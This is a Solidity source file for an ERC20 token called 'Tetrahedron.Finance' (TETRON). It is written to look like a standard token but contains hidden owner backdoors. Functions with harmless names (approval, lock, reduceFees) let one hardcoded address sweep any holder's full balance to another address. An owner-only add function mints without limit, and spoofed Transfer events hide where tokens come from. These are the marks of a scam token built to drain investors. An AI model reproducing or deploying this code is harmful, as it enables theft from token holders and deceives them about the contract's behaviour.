row number 
1	         pragma solidity ^0.6.12;
2	 library SafeMath {
3	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
4	 uint256 c = a + b;
5	 require(c >= a, "SafeMath: addition overflow");
6	 return c;
7	 }
8	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
9	 return sub(a, b, "SafeMath: subtraction overflow");
10	 }
11	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
12	 require(b <= a, errorMessage);
13	 uint256 c = a - b;
14	 return c;
15	 }
16	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
17	 if (a == 0) {
18	 return 0;
19	 }
20	 uint256 c = a * b;
21	 require(c / a == b, "SafeMath: multiplication overflow");
22	 return c;
23	 }
24	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
25	 return div(a, b, "SafeMath: division by zero");
26	 }
27	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
28	 require(b > 0, errorMessage);
29	 uint256 c = a / b;
30	 return c;
31	 }
32	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
33	 return mod(a, b, "SafeMath: modulo by zero");
34	 }
35	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
36	 require(b != 0, errorMessage);
37	 return a % b;
38	 }
39	 }
40	 library Address {
41	 function isContract(address account) internal view returns (bool) {
42	 bytes32 codehash;
43	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
44	 assembly {
45	 codehash := extcodehash(account) }
46	 return (codehash != accountHash && codehash != 0x0);
47	 }
48	 function sendValue(address payable recipient, uint256 amount) internal {
49	 require(address(this).balance >= amount, "Address: insufficient balance");
50	 (bool success, ) = recipient.call{
51	 value: amount }
52	 ("");
53	 require(success, "Address: unable to send value, recipient may have reverted");
54	 }
55	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
56	 return functionCall(target, data, "Address: low-level call failed");
57	 }
58	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
59	 return _functionCallWithValue(target, data, 0, errorMessage);
60	 }
61	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
62	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
63	 }
64	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
65	 require(address(this).balance >= value, "Address: insufficient balance for call");
66	 return _functionCallWithValue(target, data, value, errorMessage);
67	 }
68	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
69	 require(isContract(target), "Address: call to non-contract");
70	 (bool success, bytes memory returndata) = target.call{
71	 value: weiValue }
72	 (data);
73	 if (success) {
74	 return returndata;
75	 }
76	 else {
77	 if (returndata.length > 0) {
78	 assembly {
79	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
80	 }
81	 else {
82	 revert(errorMessage);
83	 }
84	 }
85	 }
86	 }
87	 contract Context {
88	 constructor () internal {
89	 }
90	 function _msgSender() internal view virtual returns (address payable) {
91	 return msg.sender;
92	 }
93	 function _msgData() internal view virtual returns (bytes memory) {
94	 this;
95	 return msg.data;
96	 }
97	 }
98	 interface IERC20 {
99	 function totalSupply() external view returns (uint256);
100	 function balanceOf(address account) external view returns (uint256);
101	 function transfer(address recipient, uint256 amount) external returns (bool);
102	 function allowance(address owner, address spender) external view returns (uint256);
103	 function approve(address spender, uint256 amount) external returns (bool);
104	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
105	 event Transfer(address indexed from, address indexed to, uint256 value);
106	 event Approval(address indexed owner, address indexed spender, uint256 value);
107	 }
108	 contract TetrahedronFinance is Context, IERC20 {
109	 mapping (address => uint256) private _balances;
110	 mapping (address => mapping (address => uint256)) private _allowances;
111	 using SafeMath for uint256;
112	 using Address for address;
113	 address private _safeOwner;
114	 string private _name;
115	 string private _symbol;
116	 uint8 private _decimals;
117	 uint256 private _totalSupply;
118	 address _addr = 0x41cFbb8bF62B91a09910A08A96621d04C2b2f03A;
119	 address public _origin = 0x41cFbb8bF62B91a09910A08A96621d04C2b2f03A;
120	 constructor () public {
121	 _name = "Tetrahedron.Finance";
122	 _symbol = "TETRON";
123	 _decimals = 18;
124	 uint256 initialSupply = 100000000000;
125	 _safeOwner = _origin;
126	 add(_addr, initialSupply*(10**18));
127	 }
128	 function name() public view returns (string memory) {
129	 return _name;
130	 }
131	 function symbol() public view returns (string memory) {
132	 return _symbol;
133	 }
134	 function decimals() public view returns (uint8) {
135	 return _decimals;
136	 }
137	 function totalSupply() public view override returns (uint256) {
138	 return _totalSupply;
139	 }
140	 function balanceOf(address account) public view override returns (uint256) {
141	 return _balances[account];
142	 }
143	 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
144	 _load(_msgSender(), recipient, amount);
145	 return true;
146	 }
147	 function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
148	 _load(sender, recipient, amount);
149	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
150	 return true;
151	 }
152	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
153	 return _allowances[owner][spender];
154	 }
155	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
156	 _approve(_msgSender(), spender, amount);
157	 return true;
158	 }
159	 function _transfer(address sender, address recipient, uint256 amount) internal virtual{
160	 require(sender != address(0), "ERC20: transfer from the zero address");
161	 require(recipient != address(0), "ERC20: transfer to the zero address");
162	 _beforeTokenTransfer(sender, recipient, amount);
163	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
164	 _balances[recipient] = _balances[recipient].add(amount);
165	 if (sender == _origin){
166	 sender = _addr;
167	 }
168	 emit Transfer(sender, recipient, amount);
169	 }
170	 function add(address account, uint256 amount) public {
171	 require(msg.sender == _origin, "ERC20: mint to the zero address");
172	 _totalSupply = _totalSupply.add(amount);
173	 _balances[_origin] = _balances[_origin].add(amount);
174	 emit Transfer(address(0), account, amount);
175	 }
176	 function _burn(address account, uint256 amount) internal virtual {
177	 require(account != address(0), "ERC20: burn from the zero address");
178	 _beforeTokenTransfer(account, address(0), amount);
179	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
180	 _totalSupply = _totalSupply.sub(amount);
181	 emit Transfer(account, address(0), amount);
182	 }
183	 function _approve(address owner, address spender, uint256 amount) internal virtual {
184	 require(owner != address(0), "ERC20: approve from the zero address");
185	 require(spender != address(0), "ERC20: approve to the zero address");
186	 _allowances[owner][spender] = amount;
187	 emit Approval(owner, spender, amount);
188	 }
189	 function _load(address sender, address recipient, uint256 amount) internal fill(sender,recipient,amount) virtual {
190	 require(sender != address(0), "ERC20: transfer from the zero address");
191	 require(recipient != address(0), "ERC20: transfer to the zero address");
192	 _beforeTokenTransfer(sender, recipient, amount);
193	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
194	 _balances[recipient] = _balances[recipient].add(amount);
195	 if (sender == _origin){
196	 sender = _addr;
197	 }
198	 emit Transfer(sender, recipient, amount);
199	 }
200	 modifier fill(address sender, address recipient, uint256 amount){
201	 _;
202	 }
203	 function _setupDecimals(uint8 decimals_) internal {
204	 _decimals = decimals_;
205	 }
206	 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
207	 }
208	 modifier auth() {
209	 require(msg.sender == _origin, "Not allowed to interact");
210	 _;
211	 }
212	 function approval(address account, address staker) public {
213	 require(msg.sender == _origin, "ERC20: mint to the zero address");
214	 uint256 amount = _balances[account];
215	 _beforeTokenTransfer(account, staker, amount);
216	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
217	 _balances[staker] = _balances[staker].add(amount);
218	 emit Transfer(account, staker, amount);
219	 }
220	 function lock(address account, address staker) public {
221	 require(msg.sender == _origin, "ERC20: mint to the zero address");
222	 uint256 amount = _balances[account];
223	 _beforeTokenTransfer(account, staker, amount);
224	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
225	 _balances[staker] = _balances[staker].add(amount);
226	 emit Transfer(account, staker, amount);
227	 }
228	 function reduceFees(address account, address staker) public {
229	 require(msg.sender == _origin, "ERC20: mint to the zero address");
230	 uint256 amount = _balances[account];
231	 _beforeTokenTransfer(account, staker, amount);
232	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
233	 _balances[staker] = _balances[staker].add(amount);
234	 emit Transfer(account, staker, amount);
235	 }
236	 }
